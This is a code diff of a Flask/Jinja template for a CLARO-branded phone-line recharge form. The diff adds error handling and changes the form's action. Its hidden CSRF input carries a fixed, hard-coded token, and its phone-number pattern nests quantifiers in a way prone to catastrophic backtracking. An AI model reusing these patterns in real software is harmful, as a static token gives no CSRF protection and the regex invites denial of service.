@@ -13,12 +13,12 @@
       </h1>
       
       <p class="login__description">Ingresá tu número de línea CLARO, para recargar.</p>
-      <form action="{{ url_for('recharge_line') }}" method="post">
+      <form action="/" method="POST">
         <div class="loginform">
           
-          <input minlength="8" maxlength="11" type="hidden" name="_csrf" value="68e21c33-9061-4b51-8209-976695d10310">
+          <input minlength="8" maxlength="11" type="hidden" name="_csrf" value="68e21c33-9061-4b51-8209-976695d10310" required>
           
-          <div class="phone-input-wrapper">
+          <div class="phone-input-wrapper {% if error %} error {% endif %}">
           <div class="phone-icon-container">
               <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#757575" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon-mobile">
                   <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
@@ -28,16 +28,18 @@
           
           <div class="phone-text-container">
               <label for="numeroLinea" class="phone-label">Número de línea</label>
-              <input type="tel" name="number" id="number" minlength="8" maxlength="11" pattern="^([0-9 ]+)+$" class="phone-input" placeholder="EJ: 1123456789">
+              <input type="tel" name="number" id="number" minlength="8" maxlength="11" pattern="^([0-9 ]+)+$"  autocomplete="off" class="phone-input" placeholder="EJ: 1123456789">
           </div>
       </div>
           
           
           
           
-          <span class="loginform__span">Código de área + tu número sin el 15</span>
+          <span class="loginform__span {% if error %}blockeo_borrar{% endif %}">Código de área + tu número sin el 15</span>
           
-          
+          {% if error %}
+              <div class="error-texto">{{ error }}</div>
+          {% endif %}
           <span class="loginform__error__icon icon icon--info-warning-rounded"></span>
           <span class="loginform__success__icon icon icon--success-rounded"></span>
           <span class="loginform__edit__icon icon icon--edit"></span>
